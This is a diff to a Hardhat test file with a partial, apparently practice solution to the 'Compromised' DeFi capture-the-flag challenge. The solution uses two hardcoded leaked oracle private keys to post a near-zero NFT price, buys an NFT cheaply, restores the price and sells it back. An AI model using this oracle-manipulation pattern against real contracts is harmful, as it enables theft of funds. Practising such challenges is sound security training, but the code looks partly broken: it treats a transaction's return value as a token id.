@@ -1,5 +1,5 @@
 const { expect } = require('chai');
-const { ethers } = require('hardhat');
+const { ethers, BigNumber } = require('hardhat');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
 
 describe('Compromised challenge', function () {
@@ -53,6 +53,34 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // I should buy nfts for lower price and sell for higher price
+        // To do that I should compromise oracles
+      
+        // How to getNFTs - 
+
+        const symbol = await nftToken.symbol();
+        console.log('Symbol is: ', symbol);
+
+        const price = await oracle.getMedianPrice('DVNFT');
+        console.log('Median price for DVNFT is: ', price);
+        const priceXZ = await oracle.getMedianPrice('XZ');
+        console.log('Median price for XZ is: ', priceXZ);
+        //await exchange.buyOne({value: PLAYER_INITIAL_ETH_BALANCE});
+        const oracleA = new ethers.Wallet('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', ethers.provider);
+        const oracleB = new ethers.Wallet('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48', ethers.provider);
+        const SPECIAL_PRICE = 1;
+        await oracle.connect(oracleA).postPrice('DVNFT', SPECIAL_PRICE);
+        await oracle.connect(oracleB).postPrice('DVNFT', SPECIAL_PRICE);
+        const priceUpdated = await oracle.getMedianPrice('DVNFT');
+        console.log('Median price for DVNFT is: ', priceUpdated);
+        //const id = 0;
+        const id = await exchange.connect(player).buyOne({ value: ethers.utils.parseUnits("10", 16) });//({ value: '0x38D7EA4C68000' });
+        await oracle.connect(oracleA).postPrice('DVNFT', INITIAL_NFT_PRICE);
+        await oracle.connect(oracleB).postPrice('DVNFT', INITIAL_NFT_PRICE);
+        const priceFinal = await oracle.getMedianPrice('DVNFT');
+        console.log('Median price for DVNFT is: ', priceFinal);
+        await exchange.connect(player).sellOne(id);
+
     });
 
     after(async function () {
